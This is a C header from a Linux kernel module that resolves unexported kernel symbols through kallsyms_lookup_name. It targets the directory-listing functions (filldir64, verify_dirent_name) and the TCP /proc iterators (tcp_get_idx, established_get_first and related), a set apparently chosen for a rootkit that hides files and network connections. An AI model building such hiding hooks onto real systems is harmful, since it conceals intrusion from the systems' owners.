/*
  Access to symbols unexported by the linux kernel for dynamic linking
  with modules.
*/

#pragma once

#include <linux/types.h>
#include <linux/fs.h>

/// @name KSYMS_ALL
/// @brief Centralized definition of unexported kernel symbols which are to be resolved
///     and used.
/// @details KSYM_OP should be defined before calling this macro, in the form:
///     #define KSYM_OP(retn, symbol, ...)
///     When invoking this macro, the KSYM_OP will be generated for every defined symbol.
///     This macro is currently used in ksyms.h to extern function pointers for all defined symbols,
///     and in ksyms.c to define the global function pointers and to initialize within resolve_ksyms.
#define KSYMS_ALL()     \
KSYM_OP(int, filldir64, struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type); \
KSYM_OP(int, verify_dirent_name, const char *name, int len); \
KSYM_OP(void *, listening_get_next, struct seq_file *seq, void *cur); \
KSYM_OP(void *, tcp_get_idx, struct seq_file *seq, loff_t pos); \
KSYM_OP(void *, established_get_first, struct seq_file *seq); \
KSYM_OP(void *, established_get_next, struct seq_file *seq, void *cur);

/**
 * extern all defined kernel symbols as function pointers with ksyms__ prepended to their names.
 */
#define KSYM_OP(retn, symbol, ...) \
extern retn (*ksyms__##symbol)(__VA_ARGS__)
KSYMS_ALL();
#undef KSYM_OP

/// @brief Use `kallsyms_lookup_name` to resolve all required unexported symbols
/// @param kallsyms_lookup_name_addr address of the kallsyms_lookup_name_addr unexported symbol
/// @returns 0 on successful resolution of all symbols, non-zero if any resolution failed -
///     in which case an error will be logged and some symbols will remain uninitialized.
int resolve_ksyms(void *kallsyms_lookup_name_addr);

extern unsigned long (*ksyms__kallsyms_lookup_name)(const char *name);
